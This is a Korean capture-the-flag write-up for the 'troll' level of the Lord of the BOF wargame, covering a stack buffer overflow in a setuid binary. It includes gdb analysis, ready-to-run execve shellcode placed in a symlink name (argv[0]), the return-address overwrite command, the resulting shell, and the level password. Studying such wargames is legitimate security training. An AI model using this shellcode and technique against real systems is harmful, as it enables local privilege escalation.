# Summary

**이전 문제와 동일한 내용은 생략하고 추가된 내용만 다루었다.**

> 문제의 소스코드

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	// here is changed
	if(argc != 2){
		printf("argc must be two!\n");
		exit(0);
	}

	// egghunter
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}

	// check the length of argument
	if(strlen(argv[1]) > 48){
		printf("argument is too long!\n");
		exit(0);
	}

	strcpy(buffer, argv[1]);
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

	// one more!
	memset(argv[1], 0, strlen(argv[1]));
}
```

<br>

이전 문제와 비교하여 추가된 내용은 다음과 같다.

- `argc`가 2인지 체크하여 인자 `argv[]` 2개만 허용
- `argv[1]` 값을 0으로 초기화

<br>

이전 문제에서 풀었던 방식은 `argv[2]`에 쉘코드를 넣어 풀이했지만

이번 문제에서는 `argc`를 체크하는 로직이 추가되어 동일한 방법으로 문제를 풀이할 수 없다.

쉘코드를 넣을 수 있는 특정 공간을 우선 찾아야 될 것 같다.

<br>

# Analysis

우선 시스템의 메모리 구조는 기본적으로 아래와 같다.

![img](http://cfile24.uf.tistory.com/image/25561235544406C12974B1)



메모리 구조를 보면 사용자 공간은 0x08048000 ~ 0xBFFFFFFF이므로 

이 부분에서 우리가 인자로 줄 수 있는 공간을 찾아 쉘 코드를 삽입하면 될 것 같다.

tmp 디렉토리를 생성해 원본 파일을 복사하고 gdb 분석을 통해 확인해보자.

```python
[orge@localhost orge]$ mkdir tmp; cp troll troll.c ./tmp;
[orge@localhost orge]$ cd tmp
[orge@localhost tmp]$ ls
troll  troll.c
[orge@localhost tmp]$ gdb -q troll
(gdb) set disassembly-flavor intel
(gdb) disas main
Dump of assembler code for function main:
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %ebp,%esp
0x8048503 <main+3>:	sub    %esp,44
0x8048506 <main+6>:	cmp    DWORD PTR [%ebp+8],2
0x804850a <main+10>:	je     0x8048523 <main+35>
0x804850c <main+12>:	push   0x8048690
0x8048511 <main+17>:	call   0x8048410 <printf>
0x8048516 <main+22>:	add    %esp,4
0x8048519 <main+25>:	push   0
0x804851b <main+27>:	call   0x8048420 <exit>
0x8048520 <main+32>:	add    %esp,4
0x8048523 <main+35>:	nop
0x8048524 <main+36>:	mov    DWORD PTR [%ebp-44],0x0
0x804852b <main+43>:	nop
0x804852c <main+44>:	lea    %esi,[%esi*1]
0x8048530 <main+48>:	mov    %eax,DWORD PTR [%ebp-44]
0x8048533 <main+51>:	lea    %edx,[%eax*4]
0x804853a <main+58>:	mov    %eax,%ds:0x80497cc
0x804853f <main+63>:	cmp    DWORD PTR [%eax+%edx],0
0x8048543 <main+67>:	jne    0x8048547 <main+71>
0x8048545 <main+69>:	jmp    0x8048587 <main+135>
0x8048547 <main+71>:	mov    %eax,DWORD PTR [%ebp-44]
0x804854a <main+74>:	lea    %edx,[%eax*4]
0x8048551 <main+81>:	mov    %eax,%ds:0x80497cc
0x8048556 <main+86>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048559 <main+89>:	push   %edx
0x804855a <main+90>:	call   0x80483f0 <strlen>
0x804855f <main+95>:	add    %esp,4
0x8048562 <main+98>:	mov    %eax,%eax
0x8048564 <main+100>:	push   %eax
0x8048565 <main+101>:	push   0
0x8048567 <main+103>:	mov    %eax,DWORD PTR [%ebp-44]
0x804856a <main+106>:	lea    %edx,[%eax*4]
0x8048571 <main+113>:	mov    %eax,%ds:0x80497cc
0x8048576 <main+118>:	mov    %edx,DWORD PTR [%eax+%edx]
0x8048579 <main+121>:	push   %edx
0x804857a <main+122>:	call   0x8048430 <memset>
0x804857f <main+127>:	add    %esp,12
0x8048582 <main+130>:	inc    DWORD PTR [%ebp-44]
0x8048585 <main+133>:	jmp    0x8048530 <main+48>
0x8048587 <main+135>:	mov    %eax,DWORD PTR [%ebp+12]
0x804858a <main+138>:	add    %eax,4
0x804858d <main+141>:	mov    %edx,DWORD PTR [%eax]
0x804858f <main+143>:	add    %edx,47
0x8048592 <main+146>:	cmp    BYTE PTR [%edx],0xbf
0x8048595 <main+149>:	je     0x80485b0 <main+176>
0x8048597 <main+151>:	push   0x80486a3
0x804859c <main+156>:	call   0x8048410 <printf>
0x80485a1 <main+161>:	add    %esp,4
0x80485a4 <main+164>:	push   0
0x80485a6 <main+166>:	call   0x8048420 <exit>
0x80485ab <main+171>:	add    %esp,4
0x80485ae <main+174>:	mov    %esi,%esi
0x80485b0 <main+176>:	mov    %eax,DWORD PTR [%ebp+12]
0x80485b3 <main+179>:	add    %eax,4
0x80485b6 <main+182>:	mov    %edx,DWORD PTR [%eax]
0x80485b8 <main+184>:	push   %edx
0x80485b9 <main+185>:	call   0x80483f0 <strlen>
0x80485be <main+190>:	add    %esp,4
0x80485c1 <main+193>:	mov    %eax,%eax
0x80485c3 <main+195>:	cmp    %eax,48
0x80485c6 <main+198>:	jbe    0x80485e0 <main+224>
0x80485c8 <main+200>:	push   0x80486c0
0x80485cd <main+205>:	call   0x8048410 <printf>
0x80485d2 <main+210>:	add    %esp,4
0x80485d5 <main+213>:	push   0
0x80485d7 <main+215>:	call   0x8048420 <exit>
0x80485dc <main+220>:	add    %esp,4
0x80485df <main+223>:	nop
0x80485e0 <main+224>:	mov    %eax,DWORD PTR [%ebp+12]
0x80485e3 <main+227>:	add    %eax,4
0x80485e6 <main+230>:	mov    %edx,DWORD PTR [%eax]
0x80485e8 <main+232>:	push   %edx
0x80485e9 <main+233>:	lea    %eax,[%ebp-40]
0x80485ec <main+236>:	push   %eax
0x80485ed <main+237>:	call   0x8048440 <strcpy>
0x80485f2 <main+242>:	add    %esp,8
0x80485f5 <main+245>:	lea    %eax,[%ebp-40]
0x80485f8 <main+248>:	push   %eax
0x80485f9 <main+249>:	push   0x80486d7
0x80485fe <main+254>:	call   0x8048410 <printf>
0x8048603 <main+259>:	add    %esp,8
0x8048606 <main+262>:	push   40
0x8048608 <main+264>:	push   0
0x804860a <main+266>:	lea    %eax,[%ebp-40]
0x804860d <main+269>:	push   %eax
0x804860e <main+270>:	call   0x8048430 <memset>
0x8048613 <main+275>:	add    %esp,12
0x8048616 <main+278>:	mov    %eax,DWORD PTR [%ebp+12]
0x8048619 <main+281>:	add    %eax,4
0x804861c <main+284>:	mov    %edx,DWORD PTR [%eax]
0x804861e <main+286>:	push   %edx
0x804861f <main+287>:	call   0x80483f0 <strlen>
0x8048624 <main+292>:	add    %esp,4
0x8048627 <main+295>:	mov    %eax,%eax
0x8048629 <main+297>:	push   %eax
0x804862a <main+298>:	push   0
0x804862c <main+300>:	mov    %eax,DWORD PTR [%ebp+12]
0x804862f <main+303>:	add    %eax,4
0x8048632 <main+306>:	mov    %edx,DWORD PTR [%eax]
0x8048634 <main+308>:	push   %edx
0x8048635 <main+309>:	call   0x8048430 <memset>
0x804863a <main+314>:	add    %esp,12
0x804863d <main+317>:	leave
0x804863e <main+318>:	ret
0x804863f <main+319>:	nop
End of assembler dump.
```

<br>

gdb를 붙여서 `main`함수를 `disas(semble)`하여 `memset`을 통해 변수 초기화된 이후 지점에 브레이크 포인트를 걸고

차근차근 쉘 코드를 넣을 수 있는 적당한 공간을 찾아보자. 

스택을 정리하는 `leave`가 실행되기 전인 `main+317` 지점에 브레이크 포인트를 걸고

`0xBFFFFFFF-200` 지점 부터 string 형태로 메모리 값을 확인해보자.

```Python
(gdb) b *main+317
Breakpoint 1 at 0x804863d
(gdb) r `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"`
Starting program: /home/orge/tmp/troll `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����

Breakpoint 1, 0x804863d in main ()
(gdb) x/200s 0xbfffffff-200
0xbfffffe1:	 ""
0xbfffffe2:	 ""
0xbfffffe3:	 ""
0xbfffffe4:	 ""
0xbfffffe5:	 ""
0xbfffffe6:	 ""
0xbfffffe7:	 "/home/orge/tmp/troll"
0xbffffffc:	 ""
0xbffffffd:	 ""
0xbffffffe:	 ""
0xbfffffff:	 ""
0xc0000000:	 <Address 0xc0000000 out of bounds>
```

<br>

string을 확인해보니 `0xbfffffe7` 주소에  `env(리눅스쉘명령)` 부분이 남아 있는 것을 확인할 수 있다.

**Summary**에서 소스코드를 확인했을 때 

- argc가 2인가? == argv[2]를 사용했는가?
- argv[1]에 쉘코드가 있는가? == argv[1] 메모리 값은 모두 0으로 초기화
- 에그쉘(eggshell)을 썼는가? == 환경변수 모두 0으로 초기화

<br>

위 조건들에 포함이 되지 않는 부분인 `argv[0]`의 값은 초기화 되지 않은 채로 남아있었다.

해당 부분에 쉘코드를 삽입하면 될 것 같다.

argv[0]에는 파일명을 넣어주는 부분이다.

그렇다면 이 부분에 어떻게 쉘 코드를 넣을것인가..

<br>

바이너리의 이름을 바꾼다거나 카피를 할 경우 생성자의 권한으로 실행 권한이 바뀌어 버리기 때문에 권한을 상승할 수 없다.

바이너리에는 `setuid`가 걸려 있기 때문에 프로그램 실행 시 `effect-user-id`가 상위 권한으로 변경되어

상위 레벨의 패스워드를 확인할 수 있다.

이 문제를 해결하기 위해서는 윈도우에서 바로가기와 동일한 심볼릭 링크를 사용하면 해결할 수 있다.

심볼릭 링크를 사용해 쉘코드를 삽입하면 다음과 같다.

```python
[orge@localhost orge]$ ln -s troll `python -c "print '\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
ln: cannot create symbolic link `��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS�ᙰ
                                               ̀' to `troll': No such file or directory
```

<br>

심볼릭 링크를 정상적으로 걸어주었으나 **No such file or directory** 에러메시지가 출력되고 있다.

이는 쉘코드 문제에 있다. 이전 부터 계속 사용해오던 24bytes 쉘코드에는 `\x2f`가 포함된다.

해당 바이트 코드는 스트링 형태로 출력될 경우 `'/'`와 같으며 파일 명에 포함될 경우 디렉토리 구분자인 `'/'`로 인식된다.

따라서 위와 같은 에러 메시지를 출력하는 것이다.

<br>

이 문제를 해결하기 위한 방법은 여러가지 있다.

가장 쉬운 방법은 `\x2f`가 포함되지 않은 쉘코드를 사용하면 된다.

따라서 직접 코딩을 통해 쉘코드를 뽑아도 되고 구글링을 통해 찾은 쉘코드를 사용해도 된다.

필자는 후자를 택했다.

`\x2f`가 포함되지 않은 쉘코드로 심볼릭 링크를 생성하면 다음과 같이 정상적으로 생성된다.

```python
[orge@localhost orge]$ ln -s troll `python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"`
[orge@localhost orge]$ ls
tmp
troll
troll.c
????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????�?^1ɱ2?l?�??�?u��?�����2�Qi00tii0cjo?�QT?�?�?�?
```

<br>

쉘코드를 적당한 지점에 넣었으니 쉘코드를 삽입한 지점에 `ret`주소를 다음과 같이 `overwrite` 해주면 될 것 같다.

```python 
[orge@localhost orge]$ ./`python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"` `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault
```



# Exploit

쉘코드를 삽입한 지점인 `argv[0]` 의 주소는 이전 문제 풀이 방식과 동일하게 찾아내었다.

문제 소스코드에 아래와 같은 코드를 추가하여 컴파일한다.

```python
[orge@localhost orge]$ cd tmp
[orge@localhost tmp]$ vi troll.c
printf("argv[0] addr: %#x\n",argv[0]); // argv[0] 주소 찾는 코드를 추가
[orge@localhost tmp]$ gcc troll.c -o troll
```

<br>

심볼릭 링크 파일을 동일하게 생성하고 argv[0] 주소를 확인한다.

> argv[0] addr: 0xbffff965

```python
[orge@localhost tmp]$ ln -s troll `python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"`
[orge@localhost tmp]$ ./`python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"` `python -c "print 'A'*44+'\xbf\xbf\xbf\xbf'"`
argv[0] addr: 0xbffff965
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����
Segmentation fault (core dumped)
```

<br>

쉘코드를 삽입한 `argv[0]`의 주소를 ret에 덮어써주고 아래와 같은 exploit 코드를 작성해 실행하면 `shell`을 획득할 수 있다.

```python
[orge@localhost orge]$ ./`python -c "print '\x90'*200+'\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81'"` `python -c "print 'A'*44+'\x65\xf9\xff\xbf'"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAe���
bash$ id
uid=507(orge) gid=507(orge) euid=508(troll) egid=508(troll) groups=507(orge)
bash$ my-pass
euid = 508
aspirin
bash$
```

### Clear! password is….

aspirin